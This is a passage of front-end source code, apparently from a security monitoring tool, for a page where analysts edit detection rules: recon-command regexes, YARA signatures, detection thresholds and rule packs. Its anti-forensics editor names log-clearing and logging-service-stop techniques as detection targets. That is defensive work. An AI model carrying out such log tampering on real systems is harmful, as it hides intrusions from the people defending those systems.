import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useEffect, useRef, useState } from "react";
import { useSearchParams, Link } from "react-router-dom";
import CoveragePage from "./coverage";
import { Icon } from "../components/Icon";
import { PageHeader, Panel } from "../components/ui";
import {
  deleteCustomYaraRule,
  exportRulePack,
  getCustomYaraRules,
  getEnumPatterns,
  getLogPatterns,
  getRuleFp,
  getSamples,
  getTuning,
  importRulePack,
  resetFpThreshold,
  resetRules,
  resetTuning,
  saveBlob,
  saveCustomYaraRule,
  setEnumPatterns,
  setFpThreshold,
  setLogPatterns,
  setTuning,
  testYaraRule,
  transpileSigmaRule,
  backtestRule,
  getCommunitySigmaRules,
  importSigmaRule,
  getCustomSigmaRules,
  patchCustomSigmaRule,
  deleteCustomSigmaRule,
  backtestCustomRule,
  getSigmaBundleExport,
  simulateCustomRule,
  triggerLiveRuleTest,
} from "../lib/api";
import { clearEnumDrafts, clearLogDrafts, clearYaraDraft, readEnumDrafts, readLogDrafts, readYaraDraft, writeEnumDrafts, writeLogDrafts, writeYaraDraft } from "./rulesDrafts";
import type { CustomYaraRule, EnumPatternRow, FpDayPoint, LogPatternKind, RuleBacktestResult, RuleFpEntry, RulePack, TuningKnob, YaraTestResponse, RuleSimulationResult, RuleTriggerTestResult } from "../types";

const PLATFORM_LABELS: Record<string, string> = {
  windows: "Windows",
  linux: "Linux",
  macos: "macOS",
};

/* ── Draft persistence ────────────────────────────────────────────────────
 * The two authoring editors (recon patterns, YARA lab) persist their
 * in-progress state to localStorage so unsaved work survives a reload. Both
 * drafts are cleared on successful save — a returning analyst sees server
 * state, never a stale draft. Restore happens in useState initializers (NOT a
 * mount effect): a mirror effect would clobber the stored draft with the
 * empty default before the restore could read it back. */

/** 14-day fired/FP sparkline — the FP-rate trend (FP ÷ fired over time).
 *  Grey bars = alerts fired that day, red overlay = marked FP. A rule whose
 *  red is a big share of its grey is noise, and the threshold suggestion
 *  exists to fix exactly that. */
function FpSparkline({ history }: { history: FpDayPoint[] }) {
  const W = 120;
  const H = 26;
  const max = Math.max(1, ...history.map((d) => d.fired));
  const slot = W / Math.max(1, history.length);
  const barW = Math.max(2, slot - 2);
  return (
    <svg
      width={W}
      height={H}
      viewBox={`0 0 ${W} ${H}`}
      role="img"
      aria-label="14-day fired vs false-positive trend"
      className="shrink-0"
    >
      {history.map((d, i) => {
        const x = i * slot + (slot - barW) / 2;
        const fh = Math.max(1, (d.fired / max) * (H - 4));
        const ph = Math.max(1, (d.fp / max) * (H - 4));
        return (
          <g key={d.day}>
            <rect x={x} y={H - 2 - fh} width={barW} height={fh} rx={1} fill="var(--text-faint)" opacity={0.35} />
            {d.fp > 0 && (
              <rect x={x} y={H - 2 - ph} width={barW} height={ph} rx={1} fill="var(--risk-malicious)" opacity={0.9} />
            )}
          </g>
        );
      })}
    </svg>
  );
}

function EnumPatternsEditor() {
  const queryClient = useQueryClient();
  const { data, isLoading, isError } = useQuery({ queryKey: ["enum-patterns"], queryFn: getEnumPatterns });
  // Restore unsaved edits from localStorage so a reload mid-tuning doesn't
  // lose work. dirty is derived — any draft row means unsaved changes.
  const [drafts, setDrafts] = useState<Record<string, EnumPatternRow[]>>(() => readEnumDrafts() ?? {});
  const [saved, setSaved] = useState(false);
  const dirty = Object.keys(drafts).length > 0;

  // Mirror drafts to localStorage as they change.
  useEffect(() => {
    writeEnumDrafts(drafts);
  }, [drafts]);

  const save = useMutation({
    mutationFn: (platforms: Record<string, EnumPatternRow[]>) => setEnumPatterns(platforms),
    onSuccess: () => {
      void queryClient.invalidateQueries({ queryKey: ["enum-patterns"] });
      setDrafts({});
      clearEnumDrafts();
      setSaved(true);
      window.setTimeout(() => setSaved(false), 2000);
    },
  });

  if (isLoading) return <p className="mt-6 text-sm text-text-muted">Loading enumeration patterns…</p>;
  if (isError) return <p className="mt-6 text-sm text-risk-malicious">Couldn't load enumeration patterns.</p>;
  if (!data) return null;

  const platforms = Object.keys(data.platforms);
  const current = (platform: string): EnumPatternRow[] => {
    if (drafts[platform]) return drafts[platform];
    return data.platforms[platform];
  };
  const patch = (platform: string, rows: EnumPatternRow[]) => {
    setDrafts((d) => ({ ...d, [platform]: rows }));
  };

  return (
    <div className="mt-8">
      <div className="mb-4 flex items-start justify-between gap-4">
        <div>
          <p className="kicker">Discovery · T1082</p>
          <h2 className="mt-1 text-base font-semibold text-text-primary">Enumeration patterns</h2>
          <p className="mt-1 text-xs leading-relaxed text-text-muted">
            The per-OS recon command signatures behind the enumeration-burst rule. Each row is a regex matched against a
            process command line plus its human label; a run sweeping enough <em>distinct</em> labels fires the alert.
            Edits apply to the next ingested batch — no backend restart.
          </p>
        </div>
        <div className="flex shrink-0 items-center gap-2">
          {saved && <span className="font-mono text-[11px] text-risk-clean">saved ✓</span>}
          {dirty && (
            <button
              onClick={() => {
                if (!window.confirm("Discard ALL unsaved enumeration-pattern edits?")) return;
                setDrafts({});
                clearEnumDrafts();
              }}
              className="press rounded border border-border-subtle px-3 py-1.5 font-mono text-xs text-text-faint transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
              title="Throw away every unsaved recon-pattern edit (and any restored draft)"
            >
              Discard drafts
            </button>
          )}
          <button
            onClick={() => save.mutate(
              Object.fromEntries(platforms.map((p) => [p, drafts[p] ?? data.platforms[p]])),
            )}
            disabled={!dirty || save.isPending}
            className="press rounded border border-accent/60 px-3 py-1.5 font-mono text-xs text-accent transition-colors duration-150 hover:bg-accent/10 disabled:cursor-not-allowed disabled:opacity-40"
          >
            Save all platforms
          </button>
        </div>
      </div>

      <div className="space-y-4">
        {platforms.map((platform) => {
          const rows = current(platform);
          const defaults = data.defaults[platform];
          // A row is "custom" when either field diverges from stock — a
          // relabeled stock regex is still an operator change.
          const isCustom = (r: EnumPatternRow) =>
            defaults.some((d) => d.pattern === r.pattern && d.label === r.label) === false;
          return (
            <Panel key={platform} title={PLATFORM_LABELS[platform] ?? platform}>
              <div className="space-y-2">
                {rows.map((row, i) => (
                  <div key={i} className="flex flex-wrap items-center gap-2">
                    <input
                      value={row.pattern}
                      onChange={(e) => {
                        const next = [...rows];
                        next[i] = { ...row, pattern: e.target.value };
                        patch(platform, next);
                      }}
                      className="min-w-0 flex-1 rounded border border-border-subtle bg-bg-base px-2 py-1.5 font-mono text-[11px] text-text-primary focus:border-accent/60 focus:outline-none"
                      aria-label={`${platform} pattern regex`}
                      placeholder="regex…"
                    />
                    <input
                      value={row.label}
                      onChange={(e) => {
                        const next = [...rows];
                        next[i] = { ...row, label: e.target.value };
                        patch(platform, next);
                      }}
                      className="w-52 rounded border border-border-subtle bg-bg-base px-2 py-1.5 font-mono text-[11px] text-text-muted focus:border-accent/60 focus:outline-none"
                      aria-label={`${platform} pattern label`}
                      placeholder="label…"
                    />
                    {isCustom(row) && (
                      <span className="rounded border border-accent/40 bg-accent/10 px-1.5 py-0.5 font-mono text-[9px] uppercase tracking-wide text-accent">
                        custom
                      </span>
                    )}
                    <button
                      onClick={() => patch(platform, rows.filter((_, j) => j !== i))}
                      className="press rounded border border-border-subtle px-2 py-1.5 text-text-faint transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
                      aria-label={`Remove ${platform} pattern`}
                    >
                      <Icon name="x" size={12} />
                    </button>
                  </div>
                ))}
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => patch(platform, [...rows, { pattern: "", label: "" }])}
                    className="press inline-flex items-center gap-1.5 rounded border border-border-subtle px-2.5 py-1 font-mono text-[11px] text-text-muted transition-colors duration-150 hover:border-accent/60 hover:text-accent"
                  >
                    <Icon name="plus" size={11} />
                    Add pattern
                  </button>
                  {drafts[platform] && (
                    <button
                      onClick={() => {
                        const next = { ...drafts };
                        delete next[platform];
                        setDrafts(next); // dirty is derived from drafts
                      }}
                      className="press rounded border border-border-subtle px-2.5 py-1 font-mono text-[11px] text-text-faint transition-colors duration-150 hover:text-text-muted"
                    >
                      Revert {PLATFORM_LABELS[platform] ?? platform}
                    </button>
                  )}
                </div>
              </div>
            </Panel>
          );
        })}
      </div>
    </div>
  );
}

const LOG_KIND_LABELS: Record<LogPatternKind, { title: string; tactic: string; blurb: string }> = {
  service_stop: {
    title: "Logging-service stop patterns",
    tactic: "Defense Evasion · T1070.001",
    blurb: "The signatures behind log-service-stop — commands that silence the logging stack itself (auditd/rsyslog disabled, the Windows Event Log service stopped). Edits apply to the next ingested batch.",
  },
  log_clear: {
    title: "Log-purge patterns",
    tactic: "Defense Evasion · T1070.001",
    blurb: "The signatures behind log-clearing — wevtutil / Clear-EventLog, journal vacuuming, mass log deletion. Edits apply to the next ingested batch.",
  },
};

const EMPTY_LOG_DRAFTS = {} as Record<LogPatternKind, Record<string, EnumPatternRow[]>>;

function LogPatternsEditor() {
  const queryClient = useQueryClient();
  const { data, isLoading, isError } = useQuery({ queryKey: ["log-patterns"], queryFn: getLogPatterns });
  const [kind, setKind] = useState<LogPatternKind>("service_stop");
  // kind → platform → rows; restored from localStorage so a reload mid-edit
  // doesn't lose work. dirty is derived — any draft row means unsaved edits.
  const [drafts, setDrafts] = useState<Record<LogPatternKind, Record<string, EnumPatternRow[]>>>(() => readLogDrafts() ?? EMPTY_LOG_DRAFTS);
  const [saved, setSaved] = useState(false);
  const dirty = Object.keys(drafts).length > 0;

  useEffect(() => {
    writeLogDrafts(drafts);
  }, [drafts]);

  const save = useMutation({
    mutationFn: (patterns: Record<LogPatternKind, Record<string, EnumPatternRow[]>>) => setLogPatterns(patterns),
    onSuccess: () => {
      void queryClient.invalidateQueries({ queryKey: ["log-patterns"] });
      setDrafts(EMPTY_LOG_DRAFTS);
      clearLogDrafts();
      setSaved(true);
      window.setTimeout(() => setSaved(false), 2000);
    },
  });

  if (isLoading) return <p className="mt-6 text-sm text-text-muted">Loading log patterns…</p>;
  if (isError) return <p className="mt-6 text-sm text-risk-malicious">Couldn't load log patterns.</p>;
  if (!data) return null;

  const platforms = Object.keys(data.kinds[kind]);
  const current = (platform: string): EnumPatternRow[] => drafts[kind]?.[platform] ?? data.kinds[kind][platform];
  const patch = (platform: string, rows: EnumPatternRow[]) => {
    setDrafts((d) => ({ ...d, [kind]: { ...(d[kind] ?? {}), [platform]: rows } }));
  };
  const revertPlatform = (platform: string) => {
    setDrafts((d) => {
      const next = { ...d };
      const cur = { ...(next[kind] ?? {}) };
      delete cur[platform];
      if (Object.keys(cur).length) next[kind] = cur;
      else delete next[kind];
      return next;
    });
  };

  return (
    <div className="mt-8">
      <div className="mb-4 flex items-start justify-between gap-4">
        <div>
          <p className="kicker">{LOG_KIND_LABELS[kind].tactic}</p>
          <h2 className="mt-1 text-base font-semibold text-text-primary">Anti-forensics patterns</h2>
          <p className="mt-1 text-xs leading-relaxed text-text-muted">{LOG_KIND_LABELS[kind].blurb}</p>
        </div>
        <div className="flex shrink-0 items-center gap-2">
          {saved && <span className="font-mono text-[11px] text-risk-clean">saved ✓</span>}
          {dirty && (
            <button
              onClick={() => {
                if (!window.confirm("Discard ALL unsaved anti-forensics pattern edits?")) return;
                setDrafts(EMPTY_LOG_DRAFTS);
                clearLogDrafts();
              }}
              className="press rounded border border-border-subtle px-3 py-1.5 font-mono text-xs text-text-faint transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
              title="Throw away every unsaved log-pattern edit (and any restored draft)"
            >
              Discard drafts
            </button>
          )}
          <button
            onClick={() =>
              save.mutate(
                Object.fromEntries(
                  (Object.keys(data.kinds) as LogPatternKind[]).map((k) => [
                    k,
                    Object.fromEntries(
                      Object.keys(data.kinds[k]).map((p) => [p, drafts[k]?.[p] ?? data.kinds[k][p]]),
                    ),
                  ]),
                ) as Record<LogPatternKind, Record<string, EnumPatternRow[]>>,
              )
            }
            disabled={!dirty || save.isPending}
            className="press rounded border border-accent/60 px-3 py-1.5 font-mono text-xs text-accent transition-colors duration-150 hover:bg-accent/10 disabled:cursor-not-allowed disabled:opacity-40"
          >
            Save all platforms
          </button>
        </div>
      </div>

      <div className="mb-4 flex items-center gap-1">
        {(Object.keys(LOG_KIND_LABELS) as LogPatternKind[]).map((k) => (
          <button
            key={k}
            onClick={() => setKind(k)}
            className={`rounded px-2.5 py-1 font-mono text-[10px] uppercase tracking-wide transition-colors duration-150 ${
              kind === k ? "bg-bg-elevated text-accent" : "text-text-muted hover:text-text-primary"
            }`}
          >
            {LOG_KIND_LABELS[k].title}
          </button>
        ))}
      </div>

      <div className="space-y-4">
        {platforms.map((platform) => {
          const rows = current(platform);
          const defaults = data.defaults[kind][platform];
          const isCustom = (r: EnumPatternRow) =>
            defaults.some((d) => d.pattern === r.pattern && d.label === r.label) === false;
          return (
            <Panel key={platform} title={PLATFORM_LABELS[platform] ?? platform}>
              <div className="space-y-2">
                {rows.map((row, i) => (
                  <div key={i} className="flex flex-wrap items-center gap-2">
                    <input
                      value={row.pattern}
                      onChange={(e) => {
                        const next = [...rows];
                        next[i] = { ...row, pattern: e.target.value };
                        patch(platform, next);
                      }}
                      className="min-w-0 flex-1 rounded border border-border-subtle bg-bg-base px-2 py-1.5 font-mono text-[11px] text-text-primary focus:border-accent/60 focus:outline-none"
                      aria-label={`${platform} ${kind} pattern regex`}
                      placeholder="regex…"
                    />
                    <input
                      value={row.label}
                      onChange={(e) => {
                        const next = [...rows];
                        next[i] = { ...row, label: e.target.value };
                        patch(platform, next);
                      }}
                      className="min-w-0 flex-1 rounded border border-border-subtle bg-bg-base px-2 py-1.5 font-mono text-[11px] text-text-primary focus:border-accent/60 focus:outline-none"
                      aria-label={`${platform} ${kind} pattern label`}
                      placeholder="label…"
                    />
                    <button
                      onClick={() => patch(platform, rows.filter((_, j) => j !== i))}
                      className="press shrink-0 text-text-faint transition-colors hover:text-risk-malicious"
                      aria-label={`Remove ${kind} pattern ${i + 1}`}
                    >
                      <Icon name="x" size={12} />
                    </button>
                  </div>
                ))}
                <button
                  onClick={() => patch(platform, [...rows, { pattern: "", label: "" }])}
                  className="press rounded border border-dashed border-border-subtle px-2.5 py-1 font-mono text-[11px] text-text-muted transition-colors duration-150 hover:border-accent/50 hover:text-accent"
                >
                  + add pattern
                </button>
                {isCustom(rows[0] ?? { pattern: "", label: "" }) && (
                  <button
                    onClick={() => revertPlatform(platform)}
                    className="press rounded border border-border-subtle px-2.5 py-1 font-mono text-[11px] text-text-faint transition-colors duration-150 hover:text-text-muted"
                  >
                    Revert {PLATFORM_LABELS[platform] ?? platform}
                  </button>
                )}
              </div>
            </Panel>
          );
        })}
      </div>
    </div>
  );
}

const KNOB_LABELS: Record<string, string> = {
  BEACON_MIN_CONNECTIONS: "Min connections to flag beaconing",
  BEACON_WINDOW_MINUTES: "Beaconing look-back window (min)",
  BEACON_VARIANCE_THRESHOLD: "Beacon interval variance (s)",
  BEACON_MIN_INTERVAL_SECONDS: "Min mean interval to call it a beacon (s)",
  RENAME_BURST_THRESHOLD: "File writes to flag ransomware burst",
  RENAME_BURST_WINDOW_SECONDS: "Burst window (s)",
  ENUM_BURST_THRESHOLD: "Distinct discovery commands to flag enumeration",
  ENUM_WINDOW_SECONDS: "Enumeration look-back window (s)",
  STAGING_WINDOW_SECONDS: "Archive-then-upload window (s)",
  BASELINE_MIN_EVENTS: "Observations before baseline anomalies fire",
  DNS_TUNNEL_WINDOW_SECONDS: "DNS-tunnel look-back window (s)",
  DNS_TUNNEL_MIN_DISTINCT: "Distinct suspicious DNS labels to flag tunneling",
  DNS_LABEL_LEN: "Min DNS label length counted as suspicious (chars)",
  DNS_LABEL_ENTROPY: "Min DNS label entropy counted as suspicious (bits/char)",
  DNS_LONG_LABEL_LEN: "Single-query DNS label length to flag (chars)",
  DNS_LONG_LABEL_ENTROPY: "Single-query DNS label entropy to flag (bits/char)",
  RDP_BRUTE_WINDOW_SECONDS: "RDP brute-force look-back window (s)",
  RDP_BRUTE_MIN_CONNECTIONS: "RDP (3389) connections to flag a spray",
  FANOUT_WINDOW_SECONDS: "Fan-out look-back window (s)",
  FANOUT_MIN_PROCESSES: "Distinct processes on one destination to flag fan-out",
  FIRST_SEEN_MAX_ALERTS: "Max first-seen alerts per run (storm cap)",
  ENUM_BURST_MAX_ALERTS: "Max enumeration-burst alerts per run (storm cap)",
  NETWORK_SCAN_MAX_ALERTS: "Max network-scan alerts per run (storm cap)",
  BEACONING_MAX_ALERTS: "Max beaconing alerts per run (storm cap)",
  FANOUT_MAX_ALERTS: "Max fan-out alerts per run (storm cap)",
  FANOUT_RECUR_MIN_WINDOWS: "Distinct windows before fan-out is recurring",
  FANOUT_RECUR_LOOKBACK_SECONDS: "How far back the recurrence scan looks (seconds)",
  ALERT_CAP_DEFAULT: "Default per-rule alert cap for all other rules (storm guard)",
};

const YARA_TEMPLATE = `rule my_signature {
    strings:
        $a = "suspicious-string"
        $b = { 4D 5A 90 }
    condition:
        any of them
}`;

function YaraLab() {
  const queryClient = useQueryClient();
  const { data: savedRules } = useQuery({ queryKey: ["yara-rules"], queryFn: getCustomYaraRules });
  // Restore the in-progress rule from localStorage — a half-written rule
  // survives a reload; cleared on successful save.
  const [draft] = useState(readYaraDraft);
  const [ruleText, setRuleText] = useState(draft?.ruleText ?? YARA_TEMPLATE);
  const [family, setFamily] = useState(draft?.family ?? "custom");
  const [description, setDescription] = useState(draft?.description ?? "");
  const [scope, setScope] = useState<"all" | "picked">(draft?.scope === "picked" ? "picked" : "all");
  const [picked, setPicked] = useState<string[]>(draft?.picked ?? []);
  const [result, setResult] = useState<YaraTestResponse | null>(null);
  const [status, setStatus] = useState<{ ok: boolean; text: string } | null>(null);

  // True when the editor holds nothing beyond the pristine template. The
  // mirror persists only non-pristine state — a discarded draft truly clears
  // storage instead of the effect re-writing the template over it.
  const isPristine =
    ruleText === YARA_TEMPLATE && family === "custom" && description === "" && scope === "all" && picked.length === 0;

  // Mirror the draft on every change (authoring is keystroke-by-keystroke).
  useEffect(() => {
    if (isPristine) clearYaraDraft();
    else writeYaraDraft({ ruleText, family, description, scope, picked });
  }, [ruleText, family, description, scope, picked, isPristine]);

  const { data: vault } = useQuery({ queryKey: ["samples", "lab"], queryFn: () => getSamples({ limit: 200 }) });

  const runTest = useMutation({
    mutationFn: () => testYaraRule(ruleText, scope === "picked" && picked.length ? picked : undefined),
    onSuccess: (res) => {
      setResult(res);
      setStatus(res.compiled ? { ok: true, text: `Compiled "${res.rule_name}" — ${res.matched}/${res.total} samples matched.` } : { ok: false, text: res.error ?? "Couldn't compile the rule." });
    },
    onError: () => setStatus({ ok: false, text: "Test failed — is the backend running?" }),
  });

  const save = useMutation({
    mutationFn: () => saveCustomYaraRule(ruleText, family, description),
    onSuccess: (res) => {
      void queryClient.invalidateQueries({ queryKey: ["yara-rules"] });
      clearYaraDraft();
      setStatus({ ok: true, text: `Saved "${res.name}" — it now scans every new upload.` });
    },
    onError: (e: unknown) => setStatus({ ok: false, text: e instanceof Error ? e.message : "Couldn't save the rule." }),
  });

  const remove = useMutation({
    mutationFn: (name: string) => deleteCustomYaraRule(name),
    onSuccess: () => {
      void queryClient.invalidateQueries({ queryKey: ["yara-rules"] });
      setStatus({ ok: true, text: "Rule removed — future uploads skip it." });
    },
  });

  const loadRule = (r: CustomYaraRule) => {
    setRuleText(r.source);
    setFamily(r.family);
    setDescription(r.description);
    setResult(null);
  };

  const togglePick = (id: string) =>
    setPicked((prev) => (prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]));

  const matches = (result?.samples ?? []).filter((s) => s.matched);

  const discardDraft = () => {
    if (!window.confirm("Discard the in-progress rule draft and reset to the template?")) return;
    clearYaraDraft();
    setRuleText(YARA_TEMPLATE);
    setFamily("custom");
    setDescription("");
    setScope("all");
    setPicked([]);
    setResult(null);
    setStatus(null);
  };

  return (
    <div className="mt-8">
      <div className="mb-4 flex items-start justify-between gap-4">
        <div>
          <p className="kicker">Signature lab · custom YARA</p>
          <h2 className="mt-1 text-base font-semibold text-text-primary">Author & test rules against the vault</h2>
          <p className="mt-1 text-xs leading-relaxed text-text-muted">
            Write a rule in the YARA-subset, test it against every stored sample (or a chosen subset) to see exactly which
            strings hit, then save it — a saved rule scans every future upload, no restart. Supported: quoted ASCII atoms,            {"{"} hex blocks with `??` wildcards, and conditions with `any of them` / `all of them` / `none of them` / `$id`
            / `not` / `and` / `or` / parens.
          </p>
        </div>
        <div className="flex shrink-0 items-center gap-2">
          <button
            onClick={() => {
              setRuleText(YARA_TEMPLATE);
              setResult(null);
            }}
            className="press rounded border border-border-subtle px-3 py-1.5 font-mono text-xs text-text-muted transition-colors duration-150 hover:border-accent/60 hover:text-accent"
          >
            Reset template
          </button>
          <button
            onClick={() => runTest.mutate()}
            disabled={runTest.isPending || !ruleText.trim()}
            className="press inline-flex items-center gap-1.5 rounded border border-accent/60 bg-accent/10 px-4 py-1.5 font-mono text-xs text-accent transition-colors duration-150 hover:shadow-[var(--glow-accent)] disabled:cursor-not-allowed disabled:opacity-40"
          >
            <Icon name={runTest.isPending ? "refresh" : "play"} size={12} className={runTest.isPending ? "animate-spin" : ""} />
            {runTest.isPending ? "Scanning…" : "Test against vault"}
          </button>
        </div>
      </div>

      <Panel title="Rule editor" pad={false}>
        <textarea
          value={ruleText}
          onChange={(e) => setRuleText(e.target.value)}
          spellCheck={false}
          rows={12}
          className="w-full resize-y rounded-t-lg border-0 bg-bg-base p-4 font-mono text-xs leading-relaxed text-text-primary outline-none placeholder:text-text-faint"
          placeholder="rule my_signature { … }"
          aria-label="Rule text"
        />
        <div className="flex flex-wrap items-center gap-3 border-t border-border-subtle px-4 py-2.5">
          <label className="flex items-center gap-1.5">
            <span className="kicker">Family</span>
            <input
              value={family}
              onChange={(e) => setFamily(e.target.value)}
              className="w-32 rounded border border-border-subtle bg-bg-base px-2 py-1 font-mono text-[11px] text-text-primary focus:border-accent/60 focus:outline-none"
              aria-label="Rule family"
            />
          </label>
          <label className="flex min-w-48 flex-1 items-center gap-1.5">
            <span className="kicker">Description</span>
            <input
              value={description}
              onChange={(e) => setDescription(e.target.value)}
              className="min-w-0 flex-1 rounded border border-border-subtle bg-bg-base px-2 py-1 font-mono text-[11px] text-text-muted focus:border-accent/60 focus:outline-none"
              placeholder="optional…"
              aria-label="Rule description"
            />
          </label>
          <button
            onClick={() => save.mutate()}
            disabled={save.isPending || !ruleText.trim()}
            className="press inline-flex items-center gap-1.5 rounded border border-risk-clean/60 bg-risk-clean/10 px-3 py-1.5 font-mono text-xs text-risk-clean transition-colors duration-150 hover:shadow-[var(--glow-clean)] disabled:cursor-not-allowed disabled:opacity-40"
          >
            <Icon name="check" size={12} />
            {save.isPending ? "Saving…" : "Save rule"}
          </button>
          {!isPristine && (
            <button
              onClick={discardDraft}
              className="press inline-flex items-center gap-1.5 rounded border border-border-subtle px-3 py-1.5 font-mono text-xs text-text-faint transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
              title="Clear the in-progress draft (and any restored one) back to the template"
            >
              <Icon name="x" size={12} />
              Discard draft
            </button>
          )}
        </div>
      </Panel>

      {/* Test scope */}
      {vault && vault.samples.length > 0 && (
        <div className="mt-3 flex flex-wrap items-center gap-3">
          <div className="flex items-center gap-1 rounded-lg border border-border-subtle p-0.5">
            <button
              onClick={() => setScope("all")}
              className={`rounded-md px-2.5 py-1 font-mono text-[11px] transition-colors ${scope === "all" ? "bg-accent/15 text-accent" : "text-text-muted hover:text-text-primary"}`}
            >
              All {vault.total} samples
            </button>
            <button
              onClick={() => setScope("picked")}
              className={`rounded-md px-2.5 py-1 font-mono text-[11px] transition-colors ${scope === "picked" ? "bg-accent/15 text-accent" : "text-text-muted hover:text-text-primary"}`}
            >
              Pick {picked.length > 0 ? `(${picked.length})` : ""}
            </button>
          </div>
          {scope === "picked" && (
            <div className="flex max-w-xl flex-wrap gap-1">
              {vault.samples.map((s) => (
                <button
                  key={s.sample_id}
                  onClick={() => togglePick(s.sample_id)}
                  title={s.original_name}
                  className={`rounded border px-1.5 py-0.5 font-mono text-[10px] transition-colors ${
                    picked.includes(s.sample_id)
                      ? "border-accent/60 bg-accent/10 text-accent"
                      : "border-border-subtle text-text-faint hover:text-text-muted"
                  }`}
                >
                  {s.original_name.slice(0, 18)}
                </button>
              ))}
            </div>
          )}
        </div>
      )}

      {status && <p className={`mt-3 font-mono text-[11px] ${status.ok ? "text-risk-clean" : "text-risk-malicious"}`}>{status.text}</p>}

      {/* Results */}
      {result?.compiled && (
        <div className="mt-4">
          <Panel
            kicker="Scan results"
            title={`${result.matched} / ${result.total} matched — ${matches.length > 0 ? "" : "no hits"}`}
            pad={false}
          >
            {matches.length === 0 ? (
              <p className="p-4 text-sm text-text-muted">No stored sample matched this rule. Either it's too specific or the signal isn't in the vault.</p>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead className="border-b border-border-subtle">
                    <tr className="text-xs font-semibold text-text-muted">
                      <th className="px-4 py-2.5">Sample</th>
                      <th className="px-4 py-2.5">Platform</th>
                      <th className="px-4 py-2.5">Size</th>
                      <th className="px-4 py-2.5">Matched strings</th>
                    </tr>
                  </thead>
                  <tbody>
                    {matches.map((s) => (
                      <tr key={s.sample_id} className="border-b border-border-subtle/50">
                        <td className="px-4 py-2 font-mono text-xs text-accent">{s.original_name}</td>
                        <td className="px-4 py-2 font-mono text-[11px] text-text-muted">{s.detected_platform}</td>
                        <td className="px-4 py-2 font-mono text-[11px] text-text-faint">{s.size} B</td>
                        <td className="px-4 py-2">
                          <span className="flex flex-wrap gap-1">
                            {s.hits.map((h) => (
                              <code key={h} className="rounded border border-risk-malicious/40 bg-risk-malicious/10 px-1.5 py-0.5 font-mono text-[10px] text-risk-malicious">
                                {h}
                              </code>
                            ))}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </Panel>
        </div>
      )}

      {/* Saved rules */}
      {savedRules && savedRules.rules.length > 0 && (
        <div className="mt-6">
          <p className="kicker">Saved signatures · applied to future uploads</p>
          <div className="mt-2 space-y-2">
            {savedRules.rules.map((r) => (
              <div key={r.name} className="flex flex-wrap items-center gap-2 rounded-lg border border-border-subtle bg-bg-elevated/40 px-3 py-2">
                <button onClick={() => loadRule(r)} className="press font-mono text-xs text-accent transition-colors hover:underline" title="Load into editor">
                  {r.name}
                </button>
                <span className="rounded border border-accent/40 bg-accent/10 px-1.5 py-0.5 font-mono text-[9px] uppercase tracking-wide text-accent">
                  {r.family}
                </span>
                <span className="font-mono text-[10px] text-text-faint">
                  {r.strings.length} string{r.strings.length > 1 ? "s" : ""}
                </span>
                {r.description && <span className="text-[11px] text-text-muted">— {r.description}</span>}
                <button
                  onClick={() => remove.mutate(r.name)}
                  className="press ml-auto rounded border border-border-subtle px-2 py-1 text-text-faint transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
                  aria-label={`Delete ${r.name}`}
                >
                  <Icon name="x" size={11} />
                </button>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

/* ── Rule packs — the whole operational rule surface as one git-diffable
   JSON document (the WHIDS lesson: versioned, file-based rule packs). Export
   → keep in git → diff revisions → roll back by re-importing an earlier
   export. Import applies tuning as a full sync, suppressions additively, and
   enum patterns + FP threshold wholesale. */
function RulePackPanel() {
  const queryClient = useQueryClient();
  const fileRef = useRef<HTMLInputElement>(null);
  const sigmaFileRef = useRef<HTMLInputElement>(null);
  const [packMsg, setPackMsg] = useState<string | null>(null);
  const [packErr, setPackErr] = useState<string | null>(null);

  const doExport = async () => {
    setPackErr(null);
    try {
      const pack = await exportRulePack();
      const stamp = new Date().toISOString().slice(0, 10);
      saveBlob(new Blob([JSON.stringify(pack, null, 2)], { type: "application/json" }), `outpost-rules-${stamp}.json`);
      setPackMsg(`Exported ${pack.tuning.length} tuning knob(s), ${pack.suppressions.length} suppression(s), enum tables, FP threshold — keep the file in git for diffable rule revisions.`);
    } catch {
      setPackErr("Export failed — is the backend running?");
    }
  };

  const doExportSigma = async () => {
    setPackErr(null);
    try {
      const blob = await getSigmaBundleExport();
      saveBlob(blob, "outpost-sigma-rules.yml");
      setPackMsg("Exported full multi-document Sigma YAML ruleset bundle — ready for Splunk, Elastic, Sentinel, and pySigma pipelines.");
    } catch {
      setPackErr("Sigma export failed — is the backend running?");
    }
  };

  const doImport = async (file: File) => {
    setPackMsg(null);
    try {
      const pack = JSON.parse(await file.text()) as RulePack;
      const s = await importRulePack(pack);
      setPackMsg(
        `Imported ${file.name} — ${s.tuning_applied} knob(s) synced, ${s.suppressions_added} suppression(s) added` +
          (s.suppressions_skipped ? `, ${s.suppressions_skipped} skipped (already present)` : "") +
          `, enum patterns ${s.enum_patterns_applied ? "applied" : "unchanged"}, FP threshold ${s.fp_threshold_applied ? "set" : "unchanged"}.`,
      );
      void queryClient.invalidateQueries({ queryKey: ["tuning"] });
      void queryClient.invalidateQueries({ queryKey: ["rule-fp"] });
      void queryClient.invalidateQueries({ queryKey: ["enum-patterns"] });
    } catch (e) {
      setPackErr(e instanceof Error ? e.message.slice(0, 240) : "Import failed — not a valid rule pack?");
    }
  };

  const doImportSigma = async (file: File) => {
    setPackMsg(null);
    setPackErr(null);
    try {
      const yamlContent = await file.text();
      const res = await importSigmaRule(yamlContent, true);
      const count = (res as any).count ?? 1;
      setPackMsg(
        `Imported ${file.name} — ${count} SigmaHQ rule(s) activated into live detection store.`
      );
      void queryClient.invalidateQueries({ queryKey: ["custom-sigma-rules"] });
    } catch (e) {
      setPackErr(e instanceof Error ? e.message.slice(0, 240) : "Failed to import Sigma YAML rule.");
    }
  };

  return (
    <div className="mt-8">
      <div className="mb-3">
        <p className="kicker">Operations · rule packs</p>
        <h2 className="mt-1 text-base font-semibold text-text-primary">Versioned rule sets</h2>
      </div>
